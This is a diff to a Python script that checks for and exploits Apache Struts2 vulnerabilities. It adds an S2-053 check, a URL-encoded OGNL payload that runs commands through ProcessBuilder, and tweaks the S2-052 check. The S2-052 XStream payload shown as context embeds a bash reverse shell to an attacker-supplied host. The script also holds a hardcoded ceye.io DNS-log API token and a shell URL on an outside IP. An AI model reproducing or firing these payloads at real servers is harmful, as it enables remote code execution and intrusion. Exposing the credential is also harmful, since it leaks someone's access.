@@ -12,9 +12,9 @@ from string import letters
 
 Attack=False
 
-#这个主机名会变化
-domain = 'x.ceye.io'
 
+domain = 'x.ceye.io'
+api = '2ac0ac1cdda59cb5ea6e034d5f15f178'
 
 shell_url = 'http://118.24.x.118:8000/400.jsp'
 
@@ -363,7 +363,6 @@ def struts2_052(url):
     resolve_shell= '''<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>bash</string><string>-c</string><string>bash -i >&amp; /dev/tcp/{}/{} 0>&amp;1</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeStringreference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeStringreference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>'''.format(vps, port)
     info={}
     req_urls = [url]
-    api = '2ac0ac1cdda59cb5ea6e034d5f15f178'
     headers = {"Content-Type":"application/xml",
                "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"}
     for req_url in req_urls:
@@ -383,17 +382,39 @@ def struts2_052(url):
                 except BaseException as e:
                     pass
             else:
+                status_code=0
                 try:
                     req=requests.post(url=req_url, data=nslookup_verify, headers=headers, timeout=20)
+                    status_code= req.status_code
                 except BaseException as e:
                     pass
                 time.sleep(2)
+                if status_code==500:
+                    return req_url
                 if ceye_dnslog(api_url, banner):
                     return req_url if req_url else False
         else:
             return False
 
 
+
+
+def struts2_053(url):
+    req_urls = get_req_url(url)
+    headers = {"Content-Type": "application/x-www-form-urlencoded",
+               "User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
+    for req_url in req_urls:
+        banner = ''.join([random.choice(letters) for i in range(6)])
+        ping_verify='''redirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27ping%207{}.{}%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0D%0A'''.format(banner,domain)
+        api_url = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(api, banner)
+        try:
+            req = requests.post(url=req_url, data=ping_verify, headers=headers, timeout=20)
+        except BaseException as e:
+            pass
+        time.sleep(2)
+        if ceye_dnslog(api_url, banner):
+            return req_url
+    return False
 
 
 def poc(url):
@@ -408,7 +429,7 @@ def poc(url):
     s2_046 = struts2_046(url)
     s2_048 = struts2_048(url)
     s2_052 = struts2_052(url)
-    # s2_005 = struts2_005(url)
+    s2_053 = struts2_053(url)
     # if devmode:
     #     info.update({"devmode":devmode})
     if s2_032:
@@ -425,8 +446,8 @@ def poc(url):
         info.update({"s2_046": s2_046})
     if s2_048:
         info.update({"s2_048": s2_048})
-    # if s2_005:
-    #     info.update({"s2_005": s2_005})
+    if s2_053:
+        info.update({"s2_053": s2_053})
     if s2_052:
         info.update({"s2_052": s2_052})
     if len(info)>0:
@@ -436,7 +457,7 @@ def poc(url):
 
 
 if __name__ == '__main__':
-    print poc('http://192.168.55.1:8080/orders/3/edit')
+    print poc('http://127.0.0.1:8080')
 
 
 
